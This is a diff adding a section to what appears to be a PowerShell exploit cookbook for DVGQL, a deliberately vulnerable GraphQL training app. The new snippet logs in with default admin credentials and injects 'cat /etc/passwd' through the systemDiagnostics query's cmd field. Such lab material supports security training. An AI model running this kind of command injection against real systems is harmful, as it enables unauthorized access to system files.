@@ -219,6 +219,22 @@ Invoke-GraphQLQuery -Query $commandInjectionQuery -Uri $gqlEndpointUri -Raw
 
 ```
 
+## Code Execution - OS Command Injection #3
+```powershell
+# Admin creds for DVGQL:
+$userName = "admin"
+$password = "password"
+
+$command = "cat /etc/passwd"
+
+$commandInjectionQuery = '
+    query {
+        systemDiagnostics(username:"' + $userName + '" password:"' + $password + '", cmd:"' + $command + '")
+    }
+'
+
+Invoke-GraphQLQuery -Query $commandInjectionQuery -Uri $gqlEndpointUri -Raw
+```
 
 ## Injection :: Stored Cross Site Scripting
 ```powershell
